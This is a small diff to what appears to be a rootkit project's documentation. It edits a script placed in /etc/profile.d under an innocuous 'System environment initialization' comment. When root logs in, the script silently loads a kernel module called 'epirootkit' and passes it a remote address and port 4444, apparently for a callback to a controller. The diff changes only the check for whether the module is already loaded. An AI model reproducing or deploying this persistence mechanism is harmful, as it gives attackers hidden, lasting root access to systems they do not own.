@@ -38,7 +38,7 @@ Creates `/etc/profile.d/jules_est_bo_env.sh`:
 # System environment initialization
 if [ "$(id -u)" -eq 0 ]; then
     # Check if module is already loaded via proc filesystem
-    if [ ! -f /proc/epirootkit_status ] && ! grep -q "^epirootkit " /proc/modules 2>/dev/null; then
+    if [ ! -f /sys/kernel/epirootkit/control ] && ! grep -q "^epirootkit " /proc/modules 2>/dev/null; then
         modprobe epirootkit address=192.168.200.11 port=4444 2>/dev/null || insmod /lib/modules/$(uname -r)/extra/epirootkit.ko address=192.168.200.11 port=4444 2>/dev/null
     fi
 fi
